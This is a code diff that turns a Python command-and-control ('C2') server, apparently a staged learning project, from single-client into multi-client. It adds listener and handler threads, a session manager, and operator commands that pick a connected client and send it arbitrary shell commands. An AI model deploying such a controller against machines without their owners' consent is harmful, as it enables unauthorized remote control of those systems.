@@ -20,10 +20,12 @@ import uuid
 import logging
 import threading
 import queue
+import time
 from datetime import datetime
-from typing import Optional, Tuple, Dict
+from typing import Optional, Dict
 from common import config, protocol, logger
-from .client import Client
+from server.session import ClientSession
+from server.session_manager import SessionManager
 
 
 def generate_session_id() -> str:
@@ -54,23 +56,94 @@ def display_banner():
     print()
 
 
-def start_server() -> Optional[Tuple[socket.socket, socket.socket, str, logging.Logger]]:
+def connection_listener(
+    server_socket: socket.socket,
+    session_manager: SessionManager,
+    main_logger: logging.Logger,
+    shutdown_event: threading.Event
+):
     """
-    Initialize and start the TCP server.
+    Accept incoming client connections and spawn handler threads.
 
-    Creates a TCP socket, binds to the configured host and port,
-    waits for a single client connection, and sets up logging.
+    This function runs in a dedicated listener thread and continuously
+    accepts new client connections. For each connection, it spawns a
+    new client_handler thread to manage that client.
+
+    The listener respects the MAX_CLIENTS configuration limit and will
+    reject connections if the limit is reached.
+
+    Args:
+        server_socket: The listening server socket
+        session_manager: Shared SessionManager for all sessions
+        main_logger: Logger for server-level events
+        shutdown_event: Event to signal shutdown
 
     Returns:
-        tuple: (server_socket, client_socket, session_id, log) if successful
-        None: If server startup or connection acceptance fails
+        None (runs until shutdown_event is set)
     """
-    # Generate unique session ID
-    session_id = generate_session_id()
+    main_logger.info("[MAIN] Connection listener thread started")
+    print("[*] Connection listener started")
+    print("[*] Waiting for client connections...")
+    print()
 
-    # Setup logger for this session
-    log = logger.setup_logger(session_id)
+    # Set socket timeout for responsive shutdown checking
+    server_socket.settimeout(1.0)
 
+    while not shutdown_event.is_set():
+        try:
+            # Check if we've reached max clients
+            current_clients = session_manager.get_session_count()
+            if current_clients >= config.MAX_CLIENTS:
+                # At capacity: avoid busy-spin by sleeping briefly
+                time.sleep(0.1)
+                continue
+
+            # Try to accept a connection (will timeout after 1 second)
+            try:
+                client_socket, client_address = server_socket.accept()
+            except socket.timeout:
+                # No connection received, loop again
+                continue
+
+            # Log the new connection
+            main_logger.info(f"[MAIN] New connection from {client_address[0]}:{client_address[1]}")
+            print(f"[+] Client connected from {client_address[0]}:{client_address[1]}")
+
+            # Spawn a new thread to handle this client
+            handler_thread = threading.Thread(
+                target=client_handler,
+                args=(client_socket, client_address, session_manager, main_logger),
+                daemon=True,
+                name=f"ClientHandler-{client_address[0]}:{client_address[1]}"
+            )
+            handler_thread.start()
+
+            main_logger.info(f"[MAIN] Handler thread started for {client_address[0]}:{client_address[1]}")
+
+        except Exception as e:
+            if not shutdown_event.is_set():
+                main_logger.error(f"[MAIN] Error in listener loop: {e}")
+                print(f"[!] ERROR in listener: {e}")
+
+    main_logger.info("[MAIN] Connection listener thread shutting down")
+    print("[*] Connection listener stopped")
+
+
+def start_server(main_logger: logging.Logger) -> Optional[socket.socket]:
+    """
+    Initialize and start the TCP server (Level 3: Multi-client version).
+
+    Creates a TCP socket, binds to the configured host and port,
+    and starts listening for connections. Does NOT accept connections -
+    the connection_listener thread handles that.
+
+    Args:
+        main_logger: Logger for server-level events
+
+    Returns:
+        socket.socket: Server socket if successful
+        None: If server startup fails
+    """
     try:
         # Create TCP socket
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -81,38 +154,30 @@ def start_server() -> Optional[Tuple[socket.socket, socket.socket, str, logging.
         # Bind to configured address and port
         server_socket.bind((config.SERVER_HOST, config.SERVER_PORT))
 
-        # Listen for incoming connections
-        server_socket.listen(1)
+        # Listen for incoming connections (queue up to MAX_CLIENTS)
+        server_socket.listen(config.MAX_CLIENTS)
 
         print(f"[*] Server listening on {config.SERVER_HOST}:{config.SERVER_PORT}")
-        print("[*] Waiting for client connection...")
+        print(f"[*] Max clients: {config.MAX_CLIENTS}")
         print()
 
-        log.info(f"[{session_id}] Server started on {config.SERVER_HOST}:{config.SERVER_PORT}")
+        main_logger.info(f"[MAIN] Server started on {config.SERVER_HOST}:{config.SERVER_PORT}")
+        main_logger.info(f"[MAIN] Max clients: {config.MAX_CLIENTS}")
 
-        # Accept a single client connection (blocking)
-        client_socket, client_address = server_socket.accept()
-
-        print(f"[+] Client connected from {client_address[0]}:{client_address[1]}")
-        print()
-
-        # LOG: Client connection event
-        log.info(f"[{session_id}] Client connected from {client_address[0]}:{client_address[1]}")
-
-        return server_socket, client_socket, session_id, log
+        return server_socket
 
     except PermissionError:
         print(f"[!] ERROR: Permission denied. Cannot bind to port {config.SERVER_PORT}")
         print("[!] Try using a port > 1024 or run with elevated privileges")
-        log.error(f"[{session_id}] Permission denied on port {config.SERVER_PORT}")
+        main_logger.error(f"[MAIN] Permission denied on port {config.SERVER_PORT}")
         return None
     except OSError as e:
         print(f"[!] ERROR: Failed to start server: {e}")
-        log.error(f"[{session_id}] Failed to start server: {e}")
+        main_logger.error(f"[MAIN] Failed to start server: {e}")
         return None
     except Exception as e:
         print(f"[!] ERROR: Unexpected error during server startup: {e}")
-        log.error(f"[{session_id}] Unexpected error during startup: {e}")
+        main_logger.error(f"[MAIN] Unexpected error during startup: {e}")
         return None
 
 
@@ -178,6 +243,161 @@ def handle_registration(client_socket: socket.socket, session_id: str, log: logg
         return None
 
 
+def client_handler(
+    client_socket: socket.socket,
+    client_address: tuple,
+    session_manager: SessionManager,
+    main_logger: logging.Logger
+):
+    """
+    Handle a single client connection in a dedicated thread.
+
+    This function manages the complete lifecycle of a client connection:
+    1. Generate session ID and create logger
+    2. Handle client registration
+    3. Create and register ClientSession
+    4. Process commands from queue
+    5. Send results back
+    6. Cleanup on disconnect
+
+    This function runs in its own thread for each connected client,
+    enabling concurrent multi-client support.
+
+    Args:
+        client_socket: The connected client's socket
+        client_address: Tuple of (ip_address, port)
+        session_manager: Shared SessionManager for registering this session
+        main_logger: Main logger for server-level events
+
+    Returns:
+        None (thread exits when client disconnects)
+    """
+    session = None
+    session_id = generate_session_id()
+    log = logger.setup_logger(session_id)
+
+    try:
+        # Log the new connection
+        log.info(f"[{session_id}] Client handler started for {client_address[0]}:{client_address[1]}")
+
+        # Handle client registration
+        client_id = handle_registration(client_socket, session_id, log)
+
+        if client_id is None:
+            log.error(f"[{session_id}] Registration failed, closing connection")
+            return
+
+        # Now that we have the client_id, create a new logger with better naming
+        log = logger.setup_logger(session_id, client_id)
+        log.info(f"[{session_id}] Logger reinitialized with client_id: {client_id}")
+
+        # Create ClientSession object
+        session = ClientSession(
+            session_id=session_id,
+            client_id=client_id,
+            client_socket=client_socket,
+            client_address=client_address,
+            command_queue=queue.Queue(),
+            handler_thread=threading.current_thread(),
+            logger=log,
+            registered_at=datetime.now(),
+            last_activity=datetime.now(),
+            connected=True
+        )
+
+        # Add session to manager
+        if not session_manager.add_session(session):
+            log.error(f"[{session_id}] Client ID {client_id} already exists!")
+            print(f"[!] ERROR: Client ID {client_id} is already connected")
+            return
+
+        log.info(f"[{session_id}] Session registered in manager: {client_id}")
+        print(f"[+] Client {client_id} ready for commands")
+        print()
+
+        # Main command loop - wait for commands from operator
+        while session.connected:
+            try:
+                # Wait for command from operator (with timeout for responsive shutdown)
+                command = session.command_queue.get(timeout=1.0)
+
+                # Prepare command message
+                command_message = {
+                    'type': 'command',
+                    'command': command
+                }
+
+                # LOG: Command sent
+                log.info(f"[{session_id}] Command sent to {client_id}: {command}")
+
+                # Send command to client
+                success = protocol.send_message(client_socket, command_message)
+
+                if not success:
+                    log.error(f"[{session_id}] Failed to send command to {client_id}")
+                    print(f"[!] ERROR: Failed to send command to {client_id}")
+                    break
+
+                # Receive result from client
+                result_message = protocol.receive_message(client_socket)
+
+                if result_message is None:
+                    log.error(f"[{session_id}] Failed to receive result from {client_id}")
+                    print(f"[!] ERROR: Failed to receive result from {client_id}")
+                    break
+
+                # Validate result message type
+                if result_message.get('type') != 'result':
+                    log.warning(f"[{session_id}] Unexpected message type from {client_id}: {result_message.get('type')}")
+                    continue
+
+                # LOG: Response received
+                return_code = result_message.get('return_code', -1)
+                log.info(f"[{session_id}] Response received from {client_id} (return_code={return_code})")
+
+                # Update activity timestamp
+                session.update_activity()
+
+                # Display results with client context
+                print(f"\n[Result from {client_id}]")
+                display_results(result_message)
+
+            except queue.Empty:
+                # No command in queue, continue waiting
+                continue
+
+            except Exception as e:
+                log.error(f"[{session_id}] Error in command loop: {e}")
+                print(f"[!] ERROR: Exception in handler for {client_id}: {e}")
+                break
+
+    except Exception as e:
+        log.error(f"[{session_id}] Unexpected error in client handler: {e}")
+        print(f"[!] ERROR: Unexpected error handling client: {e}")
+
+    finally:
+        # Cleanup: always execute, even on exception
+        if session:
+            # Mark as disconnected
+            session.connected = False
+
+            # Remove from session manager
+            removed = session_manager.remove_session(session.client_id)
+            if removed:
+                log.info(f"[{session_id}] Session removed from manager: {session.client_id}")
+                print(f"[-] Client {session.client_id} disconnected")
+                print()
+
+        # Close socket
+        try:
+            client_socket.close()
+            log.info(f"[{session_id}] Client socket closed")
+        except:
+            pass
+
+        log.info(f"[{session_id}] Client handler thread exiting")
+
+
 def display_results(result_message: dict):
     """
     Display command execution results in a formatted way.
@@ -219,47 +439,70 @@ def display_results(result_message: dict):
 
 def display_help():
     """
-    Display available operator commands.
+    Display available operator commands (Level 3: Multi-client version).
     """
     print()
     print("Available Commands:")
-    print("  help          - Show this help message")
-    print("  exit, quit    - Close connection and exit server")
-    print("  Any other input will be sent as a shell command to the client")
+    print("  sessions           - List all active client sessions")
+    print("  use <client_id>    - Switch to a specific client session")
+    print("  help               - Show this help message")
+    print("  exit, quit         - Close all connections and exit server")
+    print()
+    print("When a client is selected (using 'use <client_id>'):")
+    print("  Any other input will be sent as a shell command to that client")
     print()
 
 
-def operator_interface(client_socket: socket.socket, client_id: str, session_id: str, log: logging.Logger):
+def operator_interface(
+    session_manager: SessionManager,
+    main_logger: logging.Logger,
+    shutdown_event: threading.Event
+):
     """
-    Main operator interface loop.
+    Main operator interface loop (Level 3: Multi-client version).
 
     Provides an interactive command-line interface for the operator to:
-    - Send commands to the client
-    - View command results
+    - List active client sessions
+    - Switch between client sessions
+    - Send commands to the active client
     - Exit gracefully
 
+    This function runs in the main thread and interacts with client
+    handler threads via the SessionManager and command queues.
+
     Args:
-        client_socket: The connected client socket
-        client_id: The registered client identifier
-        session_id: The session identifier for logging
-        log: Logger instance for this session
+        session_manager: Shared SessionManager for all sessions
+        main_logger: Logger for operator actions
+        shutdown_event: Event to signal shutdown to all threads
+
+    Returns:
+        None (runs until operator exits)
     """
     print("=" * 60)
-    print(f"OPERATOR INTERFACE - Connected to: {client_id}")
+    print("OPERATOR INTERFACE - Multi-Client Mode")
     print("=" * 60)
     print("Type 'help' for available commands")
+    print("Type 'sessions' to list connected clients")
     print()
 
+    current_client_id = None  # Track which client is currently active
+
     try:
-        while True:
+        while not shutdown_event.is_set():
+            # Build prompt based on whether a client is selected
+            if current_client_id:
+                prompt = f"C2 [{current_client_id}]> "
+            else:
+                prompt = "C2> "
+
             # Get command from operator
             try:
-                command = input(f"C2 [{client_id}]> ").strip()
+                command = input(prompt).strip()
             except EOFError:
                 # Handle Ctrl+D
                 print()
                 print("[*] EOF received. Exiting...")
-                log.info(f"[{session_id}] EOF received, exiting operator interface")
+                main_logger.info("[MAIN] EOF received, exiting operator interface")
                 break
 
             # Handle empty input
@@ -268,116 +511,200 @@ def operator_interface(client_socket: socket.socket, client_id: str, session_id:
 
             # Handle special commands
             if command.lower() in ['exit', 'quit']:
-                print("[*] Closing connection and exiting...")
-                log.info(f"[{session_id}] Operator requested exit")
+                print("[*] Shutting down server...")
+                main_logger.info("[MAIN] Operator requested exit")
+                shutdown_event.set()
                 break
 
-            if command.lower() == 'help':
+            elif command.lower() == 'help':
                 display_help()
                 continue
 
-            # Send command to client
-            command_message = {
-                'type': 'command',
-                'command': command
-            }
+            elif command.lower() == 'sessions':
+                # List all active sessions
+                sessions = session_manager.list_sessions()
+                print()
+                print(f"Active Sessions ({len(sessions)}):")
+                print("-" * 80)
 
-            # LOG: Command sent
-            log.info(f"[{session_id}] Command sent to {client_id}: {command}")
+                if not sessions:
+                    print("  (no active sessions)")
+                else:
+                    for s in sessions:
+                        status = "CONNECTED" if s['connected'] else "DISCONNECTED"
+                        active_marker = " <-- ACTIVE" if s['client_id'] == current_client_id else ""
+                        print(f"  [{status}] {s['client_id']:<20} {s['address']:<21} ({s['session_id']}){active_marker}")
 
-            success = protocol.send_message(client_socket, command_message)
-
-            if not success:
-                print("[!] ERROR: Failed to send command to client")
-                print("[!] Connection may be lost. Exiting...")
-                log.error(f"[{session_id}] Failed to send command to {client_id}")
-                break
-
-            # Receive result from client
-            result_message = protocol.receive_message(client_socket)
-
-            if result_message is None:
-                print("[!] ERROR: Failed to receive result from client")
-                print("[!] Connection may be lost. Exiting...")
-                log.error(f"[{session_id}] Failed to receive result from {client_id}")
-                break
-
-            # Validate result message type
-            if result_message.get('type') != 'result':
-                print(f"[!] WARNING: Unexpected message type: {result_message.get('type')}")
-                log.warning(f"[{session_id}] Unexpected message type from {client_id}: {result_message.get('type')}")
+                print("-" * 80)
+                print()
+                main_logger.info(f"[MAIN] Operator listed sessions (count: {len(sessions)})")
                 continue
 
-            # LOG: Response received
-            return_code = result_message.get('return_code', -1)
-            log.info(f"[{session_id}] Response received from {client_id} (return_code={return_code})")
+            elif command.lower().startswith('use '):
+                # Switch to a specific client
+                target_client_id = command[4:].strip()
 
-            # Display results
-            display_results(result_message)
+                if not target_client_id:
+                    print("[!] ERROR: Please specify a client_id (e.g., 'use LAPTOP-ABC')")
+                    continue
+
+                # Verify the session exists
+                session = session_manager.get_session(target_client_id)
+
+                if session is None:
+                    print(f"[!] ERROR: No session found for client '{target_client_id}'")
+                    print("[*] Use 'sessions' command to see available clients")
+                    continue
+
+                if not session.connected:
+                    print(f"[!] WARNING: Client '{target_client_id}' is disconnected")
+                    print("[*] You can select it, but commands will fail")
+
+                # Switch to this client
+                current_client_id = target_client_id
+                print(f"[*] Switched to session: {current_client_id}")
+                main_logger.info(f"[MAIN] Operator switched to session: {current_client_id}")
+                continue
+
+            else:
+                # Regular command - send to active client
+                if not current_client_id:
+                    print("[!] ERROR: No active session selected")
+                    print("[*] Use 'sessions' to list clients, then 'use <client_id>' to select one")
+                    continue
+
+                # Get the session
+                session = session_manager.get_session(current_client_id)
+
+                if session is None:
+                    print(f"[!] ERROR: Session '{current_client_id}' no longer exists")
+                    print("[*] Client may have disconnected. Use 'sessions' to see active clients")
+                    current_client_id = None
+                    continue
+
+                if not session.connected:
+                    print(f"[!] ERROR: Client '{current_client_id}' is disconnected")
+                    current_client_id = None
+                    continue
+
+                # Queue the command for the client handler thread
+                session.command_queue.put(command)
+                main_logger.info(f"[MAIN] Command queued for {current_client_id}: {command}")
+
+                # Note: Results will be displayed by the client_handler thread
+                # No need to wait here - the handler thread prints results directly
 
     except KeyboardInterrupt:
         # Handle Ctrl+C
         print()
-        print("[*] Keyboard interrupt received. Exiting...")
-        log.info(f"[{session_id}] Keyboard interrupt received")
+        print("[*] Keyboard interrupt received. Shutting down...")
+        main_logger.info("[MAIN] Keyboard interrupt received")
+        shutdown_event.set()
+
     except Exception as e:
         print(f"[!] ERROR: Unexpected error in operator interface: {e}")
-        log.error(f"[{session_id}] Unexpected error in operator interface: {e}")
+        main_logger.error(f"[MAIN] Unexpected error in operator interface: {e}")
+        shutdown_event.set()
 
 
 def main():
     """
-    Main entry point for the C2 server.
+    Main entry point for the C2 server (Level 3: Multi-client version).
 
-    Orchestrates the server startup, client registration, and operator interface.
+    Orchestrates the multi-client server startup:
+    1. Display banner
+    2. Create main logger
+    3. Start server socket
+    4. Create session manager
+    5. Start listener thread
+    6. Run operator interface (main thread)
+    7. Graceful shutdown of all threads and connections
     """
     # Display banner
     display_banner()
 
-    # Start server and wait for client (returns session_id and logger)
-    result = start_server()
-    if result is None:
+    # Create main logger for server-level events
+    main_logger = logger.setup_logger("MAIN")
+    main_logger.info("[MAIN] C2 Server starting...")
+
+    # Start server (create and bind socket)
+    server_socket = start_server(main_logger)
+    if server_socket is None:
         print("[!] Server startup failed. Exiting.")
+        main_logger.error("[MAIN] Server startup failed")
         sys.exit(1)
 
-    server_socket, client_socket, session_id, log = result
+    # Create session manager
+    session_manager = SessionManager()
+    main_logger.info("[MAIN] Session manager initialized")
+
+    # Create shutdown event for coordinating thread shutdown
+    shutdown_event = threading.Event()
+
+    # Start connection listener thread
+    listener_thread = threading.Thread(
+        target=connection_listener,
+        args=(server_socket, session_manager, main_logger, shutdown_event),
+        daemon=True,
+        name="ConnectionListener"
+    )
+    listener_thread.start()
+    main_logger.info("[MAIN] Listener thread started")
 
     try:
-        # Handle client registration
-        client_id = handle_registration(client_socket, session_id, log)
-
-        if client_id is None:
-            print("[!] Client registration failed. Exiting.")
-            log.error(f"[{session_id}] Client registration failed, shutting down")
-            client_socket.close()
-            server_socket.close()
-            sys.exit(1)
-
-        # Start operator interface
-        operator_interface(client_socket, client_id, session_id, log)
+        # Run operator interface in main thread (blocks here)
+        operator_interface(session_manager, main_logger, shutdown_event)
 
     finally:
-        # Cleanup
+        # Cleanup: shutdown all threads and close all connections
         print()
-        print("[*] Cleaning up...")
-        log.info(f"[{session_id}] Shutting down server")
+        print("[*] Shutting down server...")
+        main_logger.info("[MAIN] Beginning shutdown sequence")
 
-        try:
-            client_socket.close()
-            print("[*] Client connection closed")
-            log.info(f"[{session_id}] Client connection closed")
-        except:
-            pass
+        # Signal shutdown to all threads
+        shutdown_event.set()
 
+        # Wait for listener thread to finish (with timeout)
+        print("[*] Stopping connection listener...")
+        listener_thread.join(timeout=5.0)
+        if listener_thread.is_alive():
+            main_logger.warning("[MAIN] Listener thread did not stop gracefully")
+        else:
+            main_logger.info("[MAIN] Listener thread stopped")
+
+        # Close all client connections
+        print("[*] Closing all client connections...")
+        client_ids = session_manager.get_all_client_ids()
+
+        for client_id in client_ids:
+            session = session_manager.get_session(client_id)
+            if session:
+                try:
+                    # Mark as disconnected
+                    session.connected = False
+
+                    # Close socket
+                    session.client_socket.close()
+                    main_logger.info(f"[MAIN] Closed connection to {client_id}")
+                except Exception as e:
+                    main_logger.error(f"[MAIN] Error closing connection to {client_id}: {e}")
+
+        # Give handler threads time to exit gracefully
+        print("[*] Waiting for handler threads to finish...")
+        import time
+        time.sleep(2)
+
+        # Close server socket
         try:
             server_socket.close()
             print("[*] Server socket closed")
-            log.info(f"[{session_id}] Server socket closed")
-        except:
-            pass
+            main_logger.info("[MAIN] Server socket closed")
+        except Exception as e:
+            main_logger.error(f"[MAIN] Error closing server socket: {e}")
 
         print("[*] Server shutdown complete")
-        log.info(f"[{session_id}] Server shutdown complete")
+        main_logger.info("[MAIN] Server shutdown complete")
+        print()
 
 
 if __name__ == '__main__':
